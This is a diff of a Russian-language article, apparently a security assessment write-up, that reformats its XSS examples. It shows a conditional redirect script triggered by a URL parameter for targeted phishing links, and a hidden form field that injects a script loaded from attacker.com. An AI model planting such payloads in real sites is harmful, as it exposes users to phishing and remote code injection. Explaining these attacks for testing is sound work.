@@ -40,7 +40,7 @@
 
 Могут быть случаи, когда подобного рода атака должна совершаться в отношении только одного или нескольких пользователей, а другие о ней знать не должны.  Доработав скрипт, мы получим его срабатывание только при наличии в адресной строке параметра **attack** со значением **true**:
 
-<pre>
+```
 <script> 
     const params = new URLSearchParams(window.location.search); 
     const attack= params.get("attack"); 
@@ -48,7 +48,8 @@
         window.location.href="https://google.com" 
     }; 
 </script>
-</pre>
+>
+```
 
 Нужным пользователям может быть отправлена должным образом сформированная ссылка фишинговым письмом, а остальные про наличие такой проблемы даже не узнают:
 
@@ -62,11 +63,11 @@
 
 или через POST-запрос, например, в заранее подготовленной форме:
 
-<pre>
-<frm name=TheForm action=http://myapp.com/page.php method=post>
+```
+<form name=TheForm action=http://myapp.com/page.php method=post>
 	<input type=hidden name=foo value="<script src=http://attacker.com/bad.js></script>;"/>
-</frm>
-</pre>
+</form>
+```
 
 
 В исследуемом приложении такой вид атаки недоступен.
